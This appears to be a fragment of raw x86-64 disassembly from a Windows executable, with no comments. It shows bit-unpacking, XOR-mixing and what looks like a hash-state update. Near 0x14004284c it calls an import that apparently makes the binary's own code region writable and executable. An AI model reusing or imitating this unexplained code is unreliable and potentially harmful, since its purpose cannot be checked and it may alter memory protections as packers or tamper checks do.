   140042235:	movzx  edx,BYTE PTR [rcx+r8*1]
   14004223a:	inc    r8
   14004223d:	or     rdx,r9
   140042240:	jmp    0x140042223
   140042242:	push   0xffffffffffffffff
   140042244:	pop    r8
   140042246:	mov    r9,r8
   140042249:	mov    ecx,esi
   14004224b:	shl    r9,cl
   14004224e:	cmp    rsi,0x40
   140042252:	not    r9
   140042255:	cmovae r9,r8
   140042259:	and    r15d,0x7
   14004225d:	lea    ecx,[rsi+r15*1]
   140042261:	neg    cl
   140042263:	shrd   rdx,rax,cl
   140042267:	shr    rax,cl
   14004226a:	test   cl,0x40
   14004226d:	cmove  rax,rdx
   140042271:	and    rax,r9
   140042274:	mov    r14,QWORD PTR [rbp+0x820]
   14004227b:	lea    r10,[rsi+0x7]
   14004227f:	bswap  rax
   140042282:	shr    r10,0x3
   140042286:	mov    QWORD PTR [rbp+0x1060],rax
   14004228d:	mov    r8,r14
   140042290:	imul   r8,r10
   140042294:	push   0x8
   140042296:	pop    rcx
   140042297:	sub    rcx,r10
   14004229a:	dec    r10
   14004229d:	lea    rax,[rbp+0x85c]
   1400422a4:	lea    r11,[rax+r8*1]
   1400422a8:	mov    rax,r8
   1400422ab:	xor    edx,edx
   1400422ad:	div    r13
   1400422b0:	cmp    rcx,0x8
   1400422b4:	je     0x1400422da
   1400422b6:	cmp    r10,0x7
   1400422ba:	ja     0x140059d80
   1400422c0:	imul   rax,rax,0xffffffffffffffec
   1400422c4:	mov    al,BYTE PTR [r11+rax*1]
   1400422c8:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   1400422cf:	inc    rcx
   1400422d2:	inc    r11
   1400422d5:	inc    r8
   1400422d8:	jmp    0x1400422a8
   1400422da:	mov    rdx,QWORD PTR [rbp+0x1060]
   1400422e1:	bswap  rdx
   1400422e4:	and    rdx,r9
   1400422e7:	inc    r14
   1400422ea:	mov    QWORD PTR [rbp+0x820],r14
   1400422f1:	mov    r9,QWORD PTR [rbp+0x890]
   1400422f8:	mov    r12,QWORD PTR [rbp+0x888]
   1400422ff:	mov    rdi,QWORD PTR [rbp+0x880]
   140042306:	mov    rbx,QWORD PTR [rbp+0x870]
   14004230d:	mov    r15,QWORD PTR [rbp+0x878]
   140042314:	xor    r8d,r8d
   140042317:	mov    rax,r9
   14004231a:	sub    rax,r12
   14004231d:	sub    rax,rdi
   140042320:	cmp    rax,rsi
   140042323:	cmovae rax,rsi
   140042327:	cmp    rax,0x1
   14004232b:	adc    rax,0x0
   14004232f:	mov    ecx,esi
   140042331:	sub    ecx,eax
   140042333:	and    cl,0x3f
   140042336:	cmp    rsi,rax
   140042339:	movzx  ecx,cl
   14004233c:	cmovbe ecx,r8d
   140042340:	shr    rdx,cl
   140042343:	mov    ecx,eax
   140042345:	shld   r15,rbx,cl
   140042349:	shl    rbx,cl
   14004234c:	test   al,0x40
   14004234e:	cmovne r15,rbx
   140042352:	mov    ecx,0x0
   140042357:	cmove  rcx,rbx
   14004235b:	or     rcx,rdx
   14004235e:	mov    QWORD PTR [rbp+0x878],r15
   140042365:	mov    QWORD PTR [rbp+0x870],rcx
   14004236c:	add    rdi,rax
   14004236f:	mov    QWORD PTR [rbp+0x880],rdi
   140042376:	mov    rbx,rcx
   140042379:	jmp    0x140041e33
   14004237e:	mov    QWORD PTR [rbp+0x1168],r9
   140042385:	add    rdi,0xfffffffffffffff8
   140042389:	mov    rax,rbx
   14004238c:	mov    ecx,edi
   14004238e:	shrd   rax,r15,cl
   140042392:	mov    rdx,r15
   140042395:	shr    rdx,cl
   140042398:	push   0xffffffffffffffff
   14004239a:	pop    r9
   14004239c:	mov    r8,r9
   14004239f:	shl    r8,cl
   1400423a2:	test   dil,0x40
   1400423a6:	cmove  rdx,rax
   1400423aa:	mov    rax,r9
   1400423ad:	cmovne rax,r8
   1400423b1:	mov    ecx,0x0
   1400423b6:	cmove  rcx,r8
   1400423ba:	mov    QWORD PTR [rbp+0x880],rdi
   1400423c1:	not    rcx
   1400423c4:	not    rax
   1400423c7:	and    rax,r15
   1400423ca:	and    rcx,rbx
   1400423cd:	test   rdi,rdi
   1400423d0:	cmove  rcx,rdi
   1400423d4:	cmove  rax,rdi
   1400423d8:	mov    QWORD PTR [rbp+0x878],rax
   1400423df:	mov    QWORD PTR [rbp+0x870],rcx
   1400423e6:	add    r12,0x8
   1400423ea:	mov    QWORD PTR [rbp+0x888],r12
   1400423f1:	mov    rbx,rcx
   1400423f4:	mov    r15,rax
   1400423f7:	mov    rcx,QWORD PTR [rbp+0x1178]
   1400423fe:	inc    rcx
   140042401:	mov    QWORD PTR [rbp+0x1178],rcx
   140042408:	lea    rcx,[rbp+0x500]
   14004240f:	call   0x14003c141
   140042414:	jmp    0x140041e07
   140042419:	lea    rax,[rbp+0x500]
   140042420:	mov    rcx,QWORD PTR [rax]
   140042423:	mov    QWORD PTR [rbp+0x1178],rcx
   14004242a:	mov    r12,QWORD PTR [rax+0x8]
   14004242e:	mov    rdi,QWORD PTR [rax+0x10]
   140042432:	lea    r9,[rip+0x45bbf]        # 0x140087ff8
   140042439:	xor    r15d,r15d
   14004243c:	mov    rcx,r12
   14004243f:	mov    rdx,rdi
   140042442:	xor    r8d,r8d
   140042445:	call   0x14003c1d3
   14004244a:	movzx  ebx,BYTE PTR [rax]
   14004244d:	lea    r9,[rip+0x45bbc]        # 0x140088010
   140042454:	push   0x1
   140042456:	pop    r8
   140042458:	mov    rcx,r12
   14004245b:	mov    rdx,rdi
   14004245e:	call   0x14003c1d3
   140042463:	movzx  esi,BYTE PTR [rax]
   140042466:	lea    r9,[rip+0x45bbb]        # 0x140088028
   14004246d:	push   0x2
   14004246f:	pop    r8
   140042471:	mov    rcx,r12
   140042474:	mov    rdx,rdi
   140042477:	call   0x14003c1d3
   14004247c:	movzx  r14d,BYTE PTR [rax]
   140042480:	lea    r9,[rip+0x45bb9]        # 0x140088040
   140042487:	push   0x3
   140042489:	pop    r8
   14004248b:	mov    rcx,r12
   14004248e:	mov    rdx,rdi
   140042491:	call   0x14003c1d3
   140042496:	movzx  eax,BYTE PTR [rax]
   140042499:	shl    eax,0x18
   14004249c:	shl    r14d,0x10
   1400424a0:	shl    esi,0x8
   1400424a3:	or     rsi,rbx
   1400424a6:	or     rsi,r14
   1400424a9:	or     rsi,rax
   1400424ac:	mov    rcx,QWORD PTR [rbp+0x1158]
   1400424b3:	shr    rcx,0x3
   1400424b7:	inc    rcx
   1400424ba:	mov    rax,rsi
   1400424bd:	xor    edx,edx
   1400424bf:	div    rcx
   1400424c2:	lea    rax,[rdx*8+0x20]
   1400424ca:	lea    rbx,[rbp+0x7d8]
   1400424d1:	mov    QWORD PTR [rbx+0xb8],rax
   1400424d8:	mov    QWORD PTR [rbx+0x38],rdx
   1400424dc:	lea    r14,[rbp+0xd10]
   1400424e3:	mov    ecx,0xc8
   1400424e8:	mov    rdi,r14
   1400424eb:	lea    rsi,[rbp+0x7d8]
   1400424f2:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   1400424f4:	mov    rcx,QWORD PTR [rbp+0x1178]
   1400424fb:	mov    rdx,r12
   1400424fe:	call   0x14006f7f7
   140042503:	mov    rax,QWORD PTR [rbp+0x1180]
   14004250a:	mov    QWORD PTR [rbx-0x8],rax
   14004250e:	mov    ecx,0xc8
   140042513:	mov    rdi,rbx
   140042516:	mov    rsi,r14
   140042519:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14004251b:	mov    rax,QWORD PTR [rbx+0x38]
   14004251f:	sub    rax,0x82
   140042525:	cmovb  rax,r15
   140042529:	shr    rax,0x4
   14004252d:	cmp    rax,0x1
   140042531:	adc    rax,0x0
   140042535:	mov    QWORD PTR [rbp+0x1178],rax
   14004253c:	lea    rcx,[rbp+0x500]
   140042543:	push   0x40
   140042545:	pop    rdx
   140042546:	call   0x14003c111
   14004254b:	xorps  xmm6,xmm6
   14004254e:	push   0x4
   140042550:	pop    rdi
   140042551:	xor    esi,esi
   140042553:	cmp    rsi,0x40
   140042557:	je     0x140042b78
   14004255d:	mov    r8,QWORD PTR [rbp+0x888]
   140042564:	mov    r9,QWORD PTR [rbp+0x890]
   14004256b:	lea    rax,[r8+0x8]
   14004256f:	cmp    rax,r9
   140042572:	jbe    0x14004257b
   140042574:	xor    edx,edx
   140042576:	jmp    0x140042b64
   14004257b:	mov    QWORD PTR [rbp+0x1168],rsi
   140042582:	mov    rax,QWORD PTR [rbp+0x880]
   140042589:	mov    rbx,QWORD PTR [rbp+0x1170]
   140042590:	cmp    rax,0x8
   140042594:	jae    0x140042ae9
   14004259a:	mov    rcx,QWORD PTR [rbp+0x820]
   1400425a1:	cmp    rcx,QWORD PTR [rbp+0x828]
   1400425a8:	jae    0x1400425ef
   1400425aa:	mov    rcx,QWORD PTR [rbp+0x7d8]
   1400425b1:	mov    rdx,QWORD PTR [rbp+0x818]
   1400425b8:	cmp    rdx,rcx
   1400425bb:	jae    0x1400425ef
   1400425bd:	mov    rax,QWORD PTR [rbp+0x1180]
   1400425c4:	movzx  esi,BYTE PTR [rax+rdx*1]
   1400425c8:	and    esi,0x7f
   1400425cb:	lea    rax,[rdx+0x1]
   1400425cf:	cmp    rax,rcx
   1400425d2:	jae    0x1400425fd
   1400425d4:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   1400425da:	test   r8b,r8b
   1400425dd:	jns    0x1400425f7
   1400425df:	shl    rsi,0x7
   1400425e3:	and    r8d,0x7f
   1400425e7:	or     rsi,r8
   1400425ea:	mov    rdx,rax
   1400425ed:	jmp    0x1400425cb
   1400425ef:	xor    r11d,r11d
   1400425f2:	jmp    0x140042a6b
   1400425f7:	inc    rdx
   1400425fa:	mov    rcx,rdx
   1400425fd:	mov    QWORD PTR [rbp+0x818],rcx
   140042604:	mov    rax,rsi
   140042607:	shr    rax,0x8
   14004260b:	mov    rbx,rsi
   14004260e:	shr    rbx,0x28
   140042612:	movaps XMMWORD PTR [rbp+0xfb0],xmm6
   140042619:	movaps XMMWORD PTR [rbp+0xfa0],xmm6
   140042620:	movaps XMMWORD PTR [rbp+0xf90],xmm6
   140042627:	movaps XMMWORD PTR [rbp+0xf80],xmm6
   14004262e:	mov    DWORD PTR [rbp+0xd10],eax
   140042634:	lea    rax,[rip+0x45a1d]        # 0x140088058
   14004263b:	mov    QWORD PTR [rsp+0x20],rax
   140042640:	lea    rcx,[rbp+0xf80]
   140042647:	mov    rdx,rdi
   14004264a:	lea    r8,[rbp+0xd10]
   140042651:	mov    r9,rdi
   140042654:	call   0x1400638fe
   140042659:	mov    BYTE PTR [rbp+0xf84],bl
   14004265f:	mov    r14,QWORD PTR [rbp+0x7f0]
   140042666:	cmp    QWORD PTR [rbp+0x838],r14
   14004266d:	jbe    0x14004279d
   140042673:	mov    r9,QWORD PTR [rbp+0x7f8]
   14004267a:	cmp    r9,0x4
   14004267e:	ja     0x140059d9c
   140042684:	mov    rcx,QWORD PTR [rbp+0x800]
   14004268b:	cmp    rcx,0x5
   14004268f:	jae    0x140059dae
   140042695:	mov    r8,QWORD PTR [rbp+0x838]
   14004269c:	cmp    r8,r14
   14004269f:	je     0x140059dbc
   1400426a5:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   1400426ac:	mov    cl,BYTE PTR [rbp+0x808]
   1400426b2:	rol    eax,cl
   1400426b4:	sub    r8,r14
   1400426b7:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   1400426bf:	xor    edx,edx
   1400426c1:	div    r8
   1400426c4:	mov    r12,rdx
   1400426c7:	mov    rax,QWORD PTR [rbp+0x840]
   1400426ce:	mov    QWORD PTR [rbp+0x1060],rax
   1400426d5:	cmp    r14,0x40
   1400426d9:	push   0x40
   1400426db:	pop    rax
   1400426dc:	cmovae r14,rax
   1400426e0:	movaps XMMWORD PTR [rbp+0xd40],xmm6
   1400426e7:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   1400426ee:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   1400426f5:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   1400426fc:	lea    rcx,[rbp+0xd10]
   140042703:	mov    rdx,r14
   140042706:	call   0x14003c0b8
   14004270b:	mov    r10,QWORD PTR [rbp+0x838]
   140042712:	test   r10,r10
   140042715:	je     0x140042763
   140042717:	mov    rcx,rax
   14004271a:	mov    r8,rdx
   14004271d:	mov    rax,rdx
   140042720:	add    rax,r12
   140042723:	mov    r9,QWORD PTR [rbp+0x830]
   14004272a:	cmp    rax,r10
   14004272d:	jbe    0x14004274d
   14004272f:	xor    r11d,r11d
   140042732:	cmp    r8,r11
   140042735:	je     0x140042763
   140042737:	lea    rax,[r11+r12*1]
   14004273b:	xor    edx,edx
   14004273d:	div    r10
   140042740:	mov    al,BYTE PTR [r9+rdx*1]
   140042744:	mov    BYTE PTR [rcx+r11*1],al
   140042748:	inc    r11
   14004274b:	jmp    0x140042732
   14004274d:	add    r9,r12
   140042750:	xor    eax,eax
   140042752:	cmp    r8,rax
   140042755:	je     0x140042763
   140042757:	mov    dl,BYTE PTR [r9+rax*1]
   14004275b:	mov    BYTE PTR [rcx+rax*1],dl
   14004275e:	inc    rax
   140042761:	jmp    0x140042752
   140042763:	mov    rcx,QWORD PTR [rbp+0x7e8]
   14004276a:	xor    eax,eax
   14004276c:	cmp    r14,rax
   14004276f:	je     0x14004279d
   140042771:	cmp    rcx,0x3f
   140042775:	ja     0x140059d8e
   14004277b:	mov    edx,eax
   14004277d:	and    edx,0x7
   140042780:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140042787:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   14004278e:	inc    rax
   140042791:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   140042798:	inc    rcx
   14004279b:	jmp    0x14004276c
   14004279d:	movaps XMMWORD PTR [rbp+0x1090],xmm6
   1400427a4:	movaps XMMWORD PTR [rbp+0x1080],xmm6
   1400427ab:	movaps XMMWORD PTR [rbp+0x1070],xmm6
   1400427b2:	movaps XMMWORD PTR [rbp+0x1060],xmm6
   1400427b9:	xor    eax,eax
   1400427bb:	mov    rbx,QWORD PTR [rbp+0x1170]
   1400427c2:	cmp    rax,0x40
   1400427c6:	je     0x1400427de
   1400427c8:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   1400427cf:	bswap  ecx
   1400427d1:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   1400427d8:	add    rax,0x4
   1400427dc:	jmp    0x1400427c2
   1400427de:	movups xmm0,XMMWORD PTR [rbp+0x848]
   1400427e5:	mov    eax,DWORD PTR [rbp+0x858]
   1400427eb:	movups XMMWORD PTR [rbp+0xd10],xmm0
   1400427f2:	mov    DWORD PTR [rbp+0xd20],eax
   1400427f8:	and    DWORD PTR [rbp+0xd24],0x0
   1400427ff:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   140042806:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   14004280d:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   140042814:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   14004281b:	lea    rax,[rbp+0xd28]
   140042822:	movups XMMWORD PTR [rax+0x30],xmm3
   140042826:	movups XMMWORD PTR [rax+0x20],xmm2
   14004282a:	movups XMMWORD PTR [rax+0x10],xmm1
   14004282e:	movups XMMWORD PTR [rax],xmm0
   140042831:	call   0x140064214
   140042836:	mov    al,BYTE PTR [rip+0x56251]        # 0x140098a8d
   14004283c:	cmp    al,0x1
   14004283e:	je     0x140042887
   140042840:	movzx  eax,al
   140042843:	cmp    eax,0x2
   140042846:	je     0x14004292d
   14004284c:	and    DWORD PTR [rbp+0x400],0x0
   140042853:	lea    rcx,[rip+0xfffffffffffbe826]        # 0x140001080
   14004285a:	mov    rdx,QWORD PTR [rbp+0x1150]
   140042861:	push   0x40
   140042863:	pop    r8
   140042865:	lea    r9,[rbp+0x400]
   14004286c:	call   QWORD PTR [rip+0x51f96]        # 0x140094808
   140042872:	test   eax,eax
   140042874:	sete   cl
   140042877:	inc    cl
   140042879:	mov    BYTE PTR [rip+0x5620e],cl        # 0x140098a8d
   14004287f:	test   eax,eax
   140042881:	je     0x14004292d
   140042887:	mov    al,BYTE PTR [rip+0x5632b]        # 0x140098bb8
   14004288d:	cmp    al,0x1
   14004288f:	je     0x1400428b4
   140042891:	movzx  eax,al
   140042894:	test   eax,eax
   140042896:	jne    0x14004292d
   14004289c:	call   0x140065d51
   1400428a1:	test   rax,rax
   1400428a4:	sete   cl
   1400428a7:	inc    cl
   1400428a9:	mov    BYTE PTR [rip+0x56309],cl        # 0x140098bb8
   1400428af:	test   rax,rax
   1400428b2:	je     0x14004292d
   1400428b4:	call   0x140064227
   1400428b9:	mov    eax,0xc8c291de
   1400428be:	xchg   DWORD PTR [rip+0x5621c],eax        # 0x140098ae0
   1400428c4:	call   QWORD PTR [rip+0x51d86]        # 0x140094650
   1400428ca:	mov    eax,eax
   1400428cc:	mov    QWORD PTR [rip+0x5572d],rax        # 0x140098000
   1400428d3:	lea    rcx,[rbp+0xd10]
   1400428da:	push   0xffffffffffffffff
   1400428dc:	pop    rdx
   1400428dd:	call   0x14002b840
   1400428e2:	xor    eax,eax
   1400428e4:	xchg   DWORD PTR [rip+0x561f6],eax        # 0x140098ae0
   1400428ea:	mov    BYTE PTR [rip+0x5619d],0x0        # 0x140098a8e
   1400428f1:	mov    eax,DWORD PTR [rbp+0xd10]
   1400428f7:	add    DWORD PTR [rbp+0x848],eax
   1400428fd:	mov    eax,DWORD PTR [rbp+0xd14]
   140042903:	add    DWORD PTR [rbp+0x84c],eax
   140042909:	mov    eax,DWORD PTR [rbp+0xd18]
   14004290f:	add    DWORD PTR [rbp+0x850],eax
   140042915:	mov    eax,DWORD PTR [rbp+0xd1c]
   14004291b:	add    DWORD PTR [rbp+0x854],eax
   140042921:	mov    eax,DWORD PTR [rbp+0xd20]
   140042927:	add    DWORD PTR [rbp+0x858],eax
   14004292d:	mov    BYTE PTR [rip+0x56158],0x0        # 0x140098a8c
   140042934:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   14004293b:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   140042942:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   140042949:	xor    eax,eax
   14004294b:	cmp    rax,0x14
   14004294f:	je     0x140042967
   140042951:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   140042958:	bswap  ecx
   14004295a:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   140042961:	add    rax,0x4
   140042965:	jmp    0x14004294b
   140042967:	mov    r8,QWORD PTR [rbp+0x7e0]
   14004296e:	mov    eax,esi
   140042970:	shr    eax,0x3
   140042973:	and    eax,0x1f
   140042976:	lea    rcx,[rax+rbp*1]
   14004297a:	add    rcx,0xd10
   140042981:	xor    r9d,r9d
   140042984:	xor    edx,edx
   140042986:	xor    eax,eax
   140042988:	cmp    r9,0x10
   14004298c:	je     0x1400429a7
   14004298e:	shld   rax,rdx,0x8
   140042993:	mov    r10,rdx
   140042996:	shl    r10,0x8
   14004299a:	movzx  edx,BYTE PTR [rcx+r9*1]
   14004299f:	inc    r9
   1400429a2:	or     rdx,r10
   1400429a5:	jmp    0x140042988
   1400429a7:	push   0xffffffffffffffff
   1400429a9:	pop    r9
   1400429ab:	mov    r10,r9
   1400429ae:	mov    ecx,r8d
   1400429b1:	shl    r10,cl
   1400429b4:	cmp    r8,0x40
   1400429b8:	not    r10
   1400429bb:	cmovae r10,r9
   1400429bf:	and    esi,0x7
   1400429c2:	lea    ecx,[r8+rsi*1]
   1400429c6:	neg    cl
   1400429c8:	shrd   rdx,rax,cl
   1400429cc:	shr    rax,cl
   1400429cf:	test   cl,0x40
   1400429d2:	cmove  rax,rdx
   1400429d6:	and    rax,r10
   1400429d9:	mov    rsi,QWORD PTR [rbp+0x820]
   1400429e0:	add    r8,0x7
   1400429e4:	bswap  rax
   1400429e7:	shr    r8,0x3
   1400429eb:	mov    QWORD PTR [rbp+0x1060],rax
   1400429f2:	mov    r9,rsi
   1400429f5:	imul   r9,r8
   1400429f9:	push   0x8
   1400429fb:	pop    rcx
   1400429fc:	sub    rcx,r8
   1400429ff:	dec    r8
   140042a02:	lea    rax,[rbp+0x85c]
   140042a09:	lea    r11,[rax+r9*1]
   140042a0d:	mov    rax,r9
   140042a10:	xor    edx,edx
   140042a12:	div    r13
   140042a15:	cmp    rcx,0x8
   140042a19:	je     0x140042a3f
   140042a1b:	cmp    r8,0x7
   140042a1f:	ja     0x140059d80
   140042a25:	imul   rax,rax,0xffffffffffffffec
   140042a29:	mov    al,BYTE PTR [r11+rax*1]
   140042a2d:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   140042a34:	inc    rcx
   140042a37:	inc    r11
   140042a3a:	inc    r9
   140042a3d:	jmp    0x140042a0d
   140042a3f:	mov    r11,QWORD PTR [rbp+0x1060]
   140042a46:	bswap  r11
   140042a49:	and    r11,r10
   140042a4c:	inc    rsi
   140042a4f:	mov    QWORD PTR [rbp+0x820],rsi
   140042a56:	mov    r9,QWORD PTR [rbp+0x890]
   140042a5d:	mov    rax,QWORD PTR [rbp+0x880]
   140042a64:	mov    r8,QWORD PTR [rbp+0x888]
   140042a6b:	mov    rdx,r9
   140042a6e:	sub    rdx,r8
   140042a71:	sub    rdx,rax
   140042a74:	mov    rcx,QWORD PTR [rbp+0x7e0]
   140042a7b:	cmp    rdx,rcx
   140042a7e:	cmovae rdx,rcx
   140042a82:	cmp    rdx,0x1
   140042a86:	adc    rdx,0x0
   140042a8a:	mov    r10d,ecx
   140042a8d:	sub    r10d,edx
   140042a90:	and    r10b,0x3f
   140042a94:	cmp    rcx,rdx
   140042a97:	movzx  ecx,r10b
   140042a9b:	cmovbe ecx,r15d
   140042a9f:	shr    r11,cl
   140042aa2:	mov    r10,QWORD PTR [rbp+0x870]
   140042aa9:	mov    rsi,QWORD PTR [rbp+0x878]
   140042ab0:	mov    ecx,edx
   140042ab2:	shld   rsi,r10,cl
   140042ab6:	shl    r10,cl
   140042ab9:	test   dl,0x40
   140042abc:	cmovne rsi,r10
   140042ac0:	mov    ecx,0x0
   140042ac5:	cmove  rcx,r10
   140042ac9:	or     rcx,r11
   140042acc:	mov    QWORD PTR [rbp+0x878],rsi
   140042ad3:	mov    QWORD PTR [rbp+0x870],rcx
   140042ada:	add    rax,rdx
   140042add:	mov    QWORD PTR [rbp+0x880],rax
   140042ae4:	jmp    0x140042590
   140042ae9:	add    rax,0xfffffffffffffff8
   140042aed:	mov    QWORD PTR [rbp+0x880],rax
   140042af4:	mov    r9,QWORD PTR [rbp+0x878]
   140042afb:	mov    r10,r9
   140042afe:	mov    ecx,eax
   140042b00:	shr    r10,cl
   140042b03:	mov    r11,QWORD PTR [rbp+0x870]
   140042b0a:	mov    rdx,r11
   140042b0d:	shrd   rdx,r9,cl
   140042b11:	push   0xffffffffffffffff
   140042b13:	pop    rbx
   140042b14:	mov    rsi,rbx
   140042b17:	shl    rsi,cl
   140042b1a:	test   al,0x40
   140042b1c:	cmovne rdx,r10
   140042b20:	mov    ecx,0x0
   140042b25:	cmove  rcx,rsi
   140042b29:	cmove  rsi,rbx
   140042b2d:	not    rsi
   140042b30:	not    rcx
   140042b33:	and    rcx,r11
   140042b36:	and    rsi,r9
   140042b39:	test   rax,rax
   140042b3c:	cmove  rsi,rax
   140042b40:	cmove  rcx,rax
   140042b44:	mov    QWORD PTR [rbp+0x870],rcx
   140042b4b:	mov    QWORD PTR [rbp+0x878],rsi
   140042b52:	add    r8,0x8
   140042b56:	mov    QWORD PTR [rbp+0x888],r8
   140042b5d:	mov    rsi,QWORD PTR [rbp+0x1168]
   140042b64:	inc    rsi
   140042b67:	lea    rcx,[rbp+0x500]
   140042b6e:	call   0x14003c141
   140042b73:	jmp    0x140042553
   140042b78:	lea    rsi,[rbp+0x500]
   140042b7f:	mov    rax,QWORD PTR [rsi]
   140042b82:	mov    QWORD PTR [rbp+0x1160],rax
   140042b89:	mov    rax,QWORD PTR [rsi+0x8]
   140042b8d:	mov    QWORD PTR [rbp+0x1140],rax
   140042b94:	mov    rax,QWORD PTR [rsi+0x10]
   140042b98:	mov    QWORD PTR [rbp+0x1168],rax
   140042b9f:	push   0x3a
   140042ba1:	pop    rdx
   140042ba2:	mov    rcx,rsi
   140042ba5:	call   0x14003c111
   140042baa:	xor    edi,edi
   140042bac:	xorps  xmm6,xmm6
   140042baf:	push   0x4
   140042bb1:	pop    r12
   140042bb3:	xor    ebx,ebx
   140042bb5:	cmp    rbx,0x3a
   140042bb9:	je     0x1400431da
   140042bbf:	mov    r8,QWORD PTR [rbp+0x888]
   140042bc6:	mov    r9,QWORD PTR [rbp+0x890]
   140042bcd:	lea    rax,[r8+0x8]
   140042bd1:	cmp    rax,r9
   140042bd4:	jbe    0x140042bdd
   140042bd6:	xor    edx,edx
   140042bd8:	jmp    0x1400431ca
   140042bdd:	mov    QWORD PTR [rbp+0x1158],rbx
   140042be4:	mov    rax,QWORD PTR [rbp+0x880]
   140042beb:	mov    rbx,QWORD PTR [rbp+0x1170]
   140042bf2:	cmp    rax,0x8
   140042bf6:	jae    0x140043148
   140042bfc:	mov    rcx,QWORD PTR [rbp+0x820]
   140042c03:	cmp    rcx,QWORD PTR [rbp+0x828]
   140042c0a:	jae    0x140042c53
   140042c0c:	mov    rcx,QWORD PTR [rbp+0x7d8]
   140042c13:	mov    rdx,QWORD PTR [rbp+0x818]
   140042c1a:	cmp    rdx,rcx
   140042c1d:	jae    0x140042c53
   140042c1f:	mov    rax,QWORD PTR [rbp+0x1180]
   140042c26:	movzx  r15d,BYTE PTR [rax+rdx*1]
   140042c2b:	and    r15d,0x7f
   140042c2f:	lea    rax,[rdx+0x1]
   140042c33:	cmp    rax,rcx
   140042c36:	jae    0x140042c61
   140042c38:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   140042c3e:	test   r8b,r8b
   140042c41:	jns    0x140042c5b
   140042c43:	shl    r15,0x7
   140042c47:	and    r8d,0x7f
   140042c4b:	or     r15,r8
   140042c4e:	mov    rdx,rax
   140042c51:	jmp    0x140042c2f
   140042c53:	xor    r11d,r11d
   140042c56:	jmp    0x1400430cb
   140042c5b:	inc    rdx
   140042c5e:	mov    rcx,rdx
   140042c61:	mov    QWORD PTR [rbp+0x818],rcx
   140042c68:	mov    rax,r15
   140042c6b:	shr    rax,0x8
   140042c6f:	mov    rsi,r15
   140042c72:	shr    rsi,0x28
   140042c76:	movaps XMMWORD PTR [rbp+0xfb0],xmm6
   140042c7d:	movaps XMMWORD PTR [rbp+0xfa0],xmm6
   140042c84:	movaps XMMWORD PTR [rbp+0xf90],xmm6
   140042c8b:	movaps XMMWORD PTR [rbp+0xf80],xmm6
   140042c92:	mov    DWORD PTR [rbp+0xd10],eax
   140042c98:	lea    rax,[rip+0x453b9]        # 0x140088058
   140042c9f:	mov    QWORD PTR [rsp+0x20],rax
   140042ca4:	lea    rcx,[rbp+0xf80]
   140042cab:	mov    rdx,r12
   140042cae:	lea    r8,[rbp+0xd10]
   140042cb5:	mov    r9,r12
   140042cb8:	call   0x1400638fe
   140042cbd:	mov    BYTE PTR [rbp+0xf84],sil
   140042cc4:	mov    rsi,QWORD PTR [rbp+0x7f0]
   140042ccb:	cmp    QWORD PTR [rbp+0x838],rsi
   140042cd2:	jbe    0x140042e02
   140042cd8:	mov    r9,QWORD PTR [rbp+0x7f8]
   140042cdf:	cmp    r9,0x4
   140042ce3:	ja     0x140059d9c
   140042ce9:	mov    rcx,QWORD PTR [rbp+0x800]
   140042cf0:	cmp    rcx,0x5
   140042cf4:	jae    0x140059dae
   140042cfa:	mov    r8,QWORD PTR [rbp+0x838]
   140042d01:	cmp    r8,rsi
   140042d04:	je     0x140059dbc
   140042d0a:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   140042d11:	mov    cl,BYTE PTR [rbp+0x808]
   140042d17:	rol    eax,cl
   140042d19:	sub    r8,rsi
   140042d1c:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   140042d24:	xor    edx,edx
   140042d26:	div    r8
   140042d29:	mov    r14,rdx
   140042d2c:	mov    rax,QWORD PTR [rbp+0x840]
   140042d33:	mov    QWORD PTR [rbp+0x1060],rax
   140042d3a:	cmp    rsi,0x40
   140042d3e:	push   0x40
   140042d40:	pop    rax
   140042d41:	cmovae rsi,rax
   140042d45:	movaps XMMWORD PTR [rbp+0xd40],xmm6
   140042d4c:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   140042d53:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   140042d5a:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   140042d61:	lea    rcx,[rbp+0xd10]
   140042d68:	mov    rdx,rsi
   140042d6b:	call   0x14003c0b8
   140042d70:	mov    r10,QWORD PTR [rbp+0x838]
   140042d77:	test   r10,r10
   140042d7a:	je     0x140042dc8
   140042d7c:	mov    rcx,rax
   140042d7f:	mov    r8,rdx
   140042d82:	mov    rax,rdx
   140042d85:	add    rax,r14
   140042d88:	mov    r9,QWORD PTR [rbp+0x830]
   140042d8f:	cmp    rax,r10
   140042d92:	jbe    0x140042db2
   140042d94:	xor    r11d,r11d
   140042d97:	cmp    r8,r11
   140042d9a:	je     0x140042dc8
   140042d9c:	lea    rax,[r11+r14*1]
   140042da0:	xor    edx,edx
   140042da2:	div    r10
   140042da5:	mov    al,BYTE PTR [r9+rdx*1]
   140042da9:	mov    BYTE PTR [rcx+r11*1],al
   140042dad:	inc    r11
   140042db0:	jmp    0x140042d97
   140042db2:	add    r9,r14
   140042db5:	xor    eax,eax
   140042db7:	cmp    r8,rax
   140042dba:	je     0x140042dc8
